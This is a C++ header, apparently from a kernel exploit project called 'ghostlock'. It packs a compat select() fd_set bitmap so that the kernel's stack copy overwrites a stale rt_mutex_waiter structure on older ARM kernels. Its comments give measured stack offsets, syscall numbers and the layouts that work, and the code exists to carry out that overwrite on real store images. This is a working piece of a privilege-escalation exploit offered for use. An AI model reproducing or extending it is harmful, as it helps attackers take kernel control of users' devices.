#ifndef GHOSTLOCK_COMPAT_BITMAP_H
#define GHOSTLOCK_COMPAT_BITMAP_H

/*
 * The compat (AArch32) select carrier's fd_set bitmap, built in the 64-bit
 * native and handed to the armv7 helper as opaque bytes.
 *
 * Geometry (measured on the six store images, docs/analysis/
 * compat-select-carrier-plan.md): `_newselect` (ARM syscall 142) copies the
 * three 40-byte user bitmaps to the kernel stack in
 * `compat_core_sys_select`; the buffer's deepest byte is `select_dst_depth`
 * (0x1e0) below the compat entry sp. The stale rt_mutex_waiter strip sits at
 * `[waiter_home - 0x58, waiter_home]` and is overwritten by that copy.
 *
 * The kernel's `compat_get_bitmap()` packs two user 32-bit words into one
 * 64-bit kernel word as `(l2 << 32) | l1`, so placing the waiter strip as
 * little-endian 8-byte words at byte offset `select_dst_depth - waiter_home`
 * reproduces the exact kernel words -- no per-word handling.
 *
 * Two measured alignments:
 *   - waiter_home 0x1c0 (futex_time64 chain): all 11 words at 0x20, exact fit;
 *     the whole strip is user-copied.
 *   - waiter_home 0x1b0 (futex_time32 chain): 9 words at 0x30; the remaining
 *     0x10 bytes are the stamp's zero `deadline`/`ww_ctx`, and the kernel's
 *     `zero_fd_set(fds.res_in)` writes them at the start of its six-bitmap
 *     stack buffer. The packer asserts both halves of that dependence.
 *
 * 5.10.236 puts the strip at 0x200 (time32) / 0x210 (time64), deeper than the
 * 0x1e0 buffer: `plan_compat_bitmap()` refuses, which is what scopes this
 * carrier to the pre-5.10.136 kernels.
 */

#include "compat/carrier_protocol.h"
#include "memory/payload_builder.h"

#include <cstdint>
#include <optional>
#include <span>

namespace ghostlock::route::compat {
    /* 320 bits = ten 32-bit words = one 40-byte fd_set; three sets. */
    inline constexpr uint32_t kBitmapSetBytes = ::ghostlock::compat::kCarrierWordsPerSet * 4U;
    inline constexpr uint32_t kBitmapBytes = ::ghostlock::compat::kCarrierBitmapBytes;
    inline constexpr uint32_t kStripBytes = memory::kWaiterBytes;      /* 0x58 */
    inline constexpr uint32_t kStripWords = memory::kWaiterWords;      /* 11 */
    inline constexpr uint32_t kFullUserWords = kStripWords;            /* time64 */
    inline constexpr uint32_t kZeroTailWords = 9;                      /* time32 */
    static_assert(kBitmapBytes == 3U * kBitmapSetBytes);
    static_assert(kBitmapBytes == 0x78);

    struct BitmapGeometry final {
        /* The profile's measured strip home (0x1b0 / 0x1c0 on this family). */
        uint32_t waiter_home = 0;
        /* The profile's measured compat-select buffer depth (0x1e0). */
        uint32_t select_dst_depth = 0;
    };

    enum class BitmapFitError : int32_t {
        None = 0,
        UnknownHome = 1,
        HomeBelowDepth = 2, /* dst < home: the strip is deeper than the buffer */
        TooDeep = 3,        /* the user copy cannot reach the strip's shallow end */
        NonZeroTail = 4,    /* time32 relies on deadline/ww_ctx being zero */
        ZeroWindow = 5,     /* the time32 tail is outside the kernel's res_* window */
        BufferMismatch = 6,
    };

    struct BitmapPlan final {
        ::ghostlock::compat::CarrierFutexAbi futex_abi = ::ghostlock::compat::CarrierFutexAbi::Time32;
        uint32_t offset = 0;   /* waiter byte 0 at this bitmap byte */
        uint32_t words = 0;    /* user-copied stamp words: 11 or 9 */
        bool zero_tail = false;
    };

    /* The ABI follows the measured chain: 0x1b0 is the time32 entry (240),
     * 0x1c0 the time64 entry (422). Any other home is unknown on this family
     * and is refused instead of being guessed at. */
    [[nodiscard]] std::optional<::ghostlock::compat::CarrierFutexAbi> abi_for_waiter_home(
        uint32_t waiter_home) noexcept;

    /* Pure geometry check. Returns false and sets *error when the carrier
     * cannot cover the strip on this image. */
    [[nodiscard]] bool plan_compat_bitmap(
        BitmapGeometry geometry, BitmapPlan *plan,
        BitmapFitError *error = nullptr) noexcept;

    /* Plan + encode. `out` must be kBitmapBytes long and is zeroed first.
     * Returns false without writing anything usable when the plan is refused. */
    [[nodiscard]] bool pack_compat_bitmap(
        const memory::WaiterWords &words, BitmapGeometry geometry,
        std::span<uint8_t> out, BitmapPlan *plan = nullptr,
        BitmapFitError *error = nullptr) noexcept;

    /* The 64-bit value the kernel will read for stamp word `word` given the
     * plan (two packed user words). Tests use it to prove the pairing. */
    [[nodiscard]] constexpr uint64_t pack_two_user_words(
        uint32_t low, uint32_t high) noexcept {
        return (static_cast<uint64_t>(high) << 32) | static_cast<uint64_t>(low);
    }
} // namespace ghostlock::route::compat

#endif
